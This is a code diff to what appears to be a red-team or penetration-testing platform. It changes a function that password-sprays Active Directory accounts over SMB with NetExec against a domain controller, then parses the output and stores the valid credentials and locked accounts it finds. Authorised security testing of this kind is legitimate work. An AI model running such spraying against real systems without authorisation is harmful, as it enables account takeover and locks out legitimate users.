@@ -1111,81 +1111,74 @@ def run_spray_task(self, session_id, usernames=None):
         return {"error": "No users"}
 
     userlist = "\n".join(usernames)
+    passlist = "\n".join(passwords)
     tmpdir = tempfile.mkdtemp(prefix="wg_spray_")
     user_file = os.path.join(tmpdir, "users.txt")
+    pass_file = os.path.join(tmpdir, "passwords.txt")
 
     try:
         with open(user_file, "w") as f:
             f.write(userlist)
+        with open(pass_file, "w") as f:
+            f.write(passlist)
 
-        for password in passwords:
-            cmd = [
-                "nxc", "smb", dc_ip,
-                "-u", user_file,
-                "-p", password,
-                "--continue-on-success",
-                "--no-bruteforce",
-            ]
-            try:
-                proc = subprocess.run(
-                    cmd,
-                    capture_output=True,
-                    text=True,
-                    timeout=120,
-                )
-                output = proc.stdout + proc.stderr
-            except subprocess.TimeoutExpired:
-                output = "Timeout after 120s"
-            except FileNotFoundError:
-                output = "nxc not found on worker"
-            except OSError as e:
-                output = "OS error: %s" % str(e)
+        # Single nxc invocation with both user and password files
+        cmd = [
+            "nxc", "smb", dc_ip,
+            "-u", user_file,
+            "-p", pass_file,
+            "--continue-on-success",
+            "--no-bruteforce",
+        ]
+        try:
+            proc = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=600,
+            )
+            output = proc.stdout + proc.stderr
+        except subprocess.TimeoutExpired:
+            output = "Timeout after 600s"
+        except FileNotFoundError:
+            output = "nxc not found on worker"
+        except OSError as e:
+            output = "OS error: %s" % str(e)
 
-            success_users = {}
-            locked_users = set()
+        success_users = {}
+        locked_users = set()
 
-            for line in output.splitlines():
-                if "[+]" in line and "\\" in line:
-                    m = re.search(r"\[\+\]\s*(\S+?):(\S+)", line)
-                    if m:
-                        # nxc format: DOMAIN\username:password
-                        raw_user = m.group(1)
-                        user_part = raw_user.split("\\", 1)[-1] if "\\" in raw_user else raw_user
-                        success_users[user_part] = m.group(2)
-                if "[*]" in line and "LOCKED" in line.upper():
-                    m = re.search(r"\[*\]\s*\S+?\\\\(\S+)", line)
-                    if m:
-                        locked_users.add(m.group(1))
+        for line in output.splitlines():
+            if "[+]" in line and "\\" in line:
+                m = re.search(r"\[\+\]\s*(\S+?):(\S+)", line)
+                if m:
+                    # nxc format: DOMAIN\username:password
+                    raw_user = m.group(1)
+                    user_part = raw_user.split("\\", 1)[-1] if "\\" in raw_user else raw_user
+                    success_users[user_part] = m.group(2)
+            if "[*]" in line and "LOCKED" in line.upper():
+                m = re.search(r"\[*\]\s*\S+?\\\\(\S+)", line)
+                if m:
+                    locked_users.add(m.group(1))
 
-            # Create/update per-user rows for ALL sprayed users
-            for username in usernames:
-                if username in success_users:
-                    status_val = "success"
-                elif username in locked_users:
-                    status_val = "locked"
-                else:
-                    status_val = "failed"
+        # Update per-user rows based on nxc results
+        for username in usernames:
+            matched_password = success_users.get(username)
+            qs = ADSprayResult.objects.filter(session=session, username=username)
+            if matched_password:
+                # Mark the matching row as success
+                qs.filter(password=matched_password).update(status="success", output=output)
+                # Other passwords for this user = failed
+                qs.exclude(password=matched_password).update(status="failed", output=output)
+            elif username in locked_users:
+                qs.update(status="locked", output=output)
+            else:
+                qs.update(status="failed", output=output)
 
-                existing = ADSprayResult.objects.filter(
-                    session=session, username=username, password=password
-                ).first()
-                if existing:
-                    existing.status = status_val
-                    existing.output = output
-                    existing.save(update_fields=["status", "output"])
-                else:
-                    ADSprayResult.objects.create(
-                        session=session,
-                        password=password,
-                        username=username,
-                        status=status_val,
-                        output=output,
-                    )
-
-            # Delete placeholder "*" rows for this password
-            ADSprayResult.objects.filter(
-                session=session, username="*", password=password
-            ).delete()
+        # Delete placeholder "*" rows
+        ADSprayResult.objects.filter(
+            session=session, username="*"
+        ).delete()
 
     finally:
         shutil.rmtree(tmpdir, ignore_errors=True)
